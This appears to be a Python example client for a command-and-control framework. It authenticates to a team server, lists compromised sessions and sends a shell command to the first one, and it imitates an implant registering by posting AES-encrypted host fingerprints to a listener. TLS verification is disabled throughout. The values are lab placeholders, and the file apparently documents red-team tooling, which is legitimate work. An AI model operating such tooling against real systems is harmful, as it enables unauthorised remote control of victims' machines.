import json
import requests
import urllib3
from implant.aes import build_implant_body

operator_key = ''
aes_key = ''
team_server_url = 'http://192.168.15.21:9000'
implant_listener_url = 'http://192.168.15.21:9090'
listener_response_template = ''

urllib3.disable_warnings()


def print_terminal_response(response):
    content_type = (response.headers.get('Content-Type') or '').split(';')[0].strip().lower()
    if content_type == 'application/x-ndjson':
        for line in response.iter_lines(decode_unicode=True):
            if line is None:
                continue
            text = str(line).strip()
            if text:
                print(text)
        return
    print(json.dumps(response.json(), indent=2))


def summarize_terminal_ndjson(response):
    events = []
    for line in response.iter_lines():
        if not line:
            continue
        try:
            events.append(json.loads(line))
        except json.JSONDecodeError:
            events.append({'status': 'chunk', 'binary_bytes': len(line)})
    return events


def team_server_example(command):
    """
    Example: list active sessions and then use the first session to
    run a command.
    """
    user, password, secret = operator_key.split(':', 2)
    base = team_server_url.rstrip('/')
    token = requests.post(
        f'{base}/auth/login',
        json={'user': user, 'pass': password, 'secret': secret},
        verify=False,
    ).json()['access_token']

    headers = {'Authorization': f'Bearer {token}'}

    hosts = requests.get(
        f'{base}/api/sessions/',
        params={'mode': 'default', 'long_polling': False},
        headers=headers,
        verify=False,
    ).json().get('sessions') or []
    
    try:
        tag = hosts[0]['tag']

        return requests.post(
            f'{base}/api/terminal/',
            json={'command': command, 'host_tag': tag, 'source_terminal': 'api'},
            headers=headers,
            verify=False,
            timeout=120,
        ).json()
    except IndexError:
        return 'No hosts found'


def implant_example(command):
    """
    Example: create an AES key to communicate with the server and then
    send fingerprinting to the server. This is the process done by the
    implant, the difference is that the AES key is generated during
    compile time.
    """
    global aes_key
    user, password, secret = operator_key.split(':', 2)
    base = team_server_url.rstrip('/')
    token = requests.post(
        f'{base}/auth/login',
        json={'user': user, 'pass': password, 'secret': secret},
        verify=False,
    ).json()['access_token']

    headers = {'Authorization': f'Bearer {token}'}

    if not aes_key:
        aes_key = requests.post(
            f'{base}/api/aes/create',
            json={},
            headers=headers,
            verify=False,
        ).json()['aesKey']

    body = build_implant_body(
        aes_key,
        {
            'option': 'new',
            'tag': 'demo01',
            'ip': '',
            'external_ip': '',
            'hostname': 'fake-fp',
            'user': 'lab',
            'arch': 'x64',
            'pid': 1,
            'os': 'windows',
            'listener': 'http',
            'delay': 2,
            'notes': command,
            'implant_config': {
                'channel': 'http',
                'host': '127.0.0.1',
                'port': '9090',
                'host_tag': 'demo01',
                'delay': 2,
            },
            'metadata': {
                'relays': [],
                'privilege': 'default',
                'internal_ip': '127.0.0.1',
                'host': '127.0.0.1',
                'port': '9090',
            },
        },
    )
    response = requests.post(
        implant_listener_url.rstrip('/') + '/',
        data=body,
        headers={'Content-Type': 'application/octet-stream'},
        verify=False,
    )

    return response.status_code


if __name__ == '__main__':
    print(team_server_example('whoami'))
    #print(implant_example('probe'))
